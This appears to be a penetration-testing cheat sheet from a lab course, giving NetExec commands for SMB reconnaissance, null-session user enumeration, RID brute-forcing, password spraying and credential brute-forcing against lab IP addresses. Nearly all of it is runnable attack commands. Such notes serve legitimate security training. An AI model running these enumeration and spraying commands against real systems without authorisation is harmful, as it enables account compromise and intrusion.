## Basic SMB Recon
#### Host Discovery
```shell
nxc smb 192.168.133.0/24
```
#### NULL Sessions
```shell
nxc smb 10.129.203.121 -u '' -p ''
nxc smb 10.129.203.121 -u 'Guest' -p ''
```
- Domain users ( --users )
- Domain groups ( --groups )
- Password policy ( --pass-pol )
- Share folders ( --shares )
#### Extracting User List
```shell
nxc smb 10.129.203.121 -u '' -p '' --users --export
$(pwd)/users.txt
sed -i "s/'/\"/g" users.txt
jq -r '.[]' users.txt > userslist.txt
```
#### Enumerating Users with --rid-brute
```shell
nxc smb 10.129.204.172 -u '' -p '' --rid-brute
```

## Password Spraying
#### Spray a password across list of users
```shell
nxc smb 10.129.203.121 -u users.txt -p Password123
nxc smb 10.129.203.121 -u noemi david grace carlos -p Password123
```
#### Spray 2 password accros a list of users
```shell
nxc smb 10.129.203.121 -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02!
```
*Note*: Use `--continue-on-success` 
#### Password attack with a list of users and passwords
This will try every permutations:
```shell
nxc smb 10.129.203.121 -u users.txt -p passwords.txt
```

This will try each username:password line by line:
```shell
nxc smb 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success
```
#### Testing Local Accounts
```shell
nxc smb 192.168.133.157 -u Administrator -p Password@123 --local-auth
```
*Note*: Domain Controllers don't have a local account database, so we can't use the flag `--local-auth` against a Domain Controller.
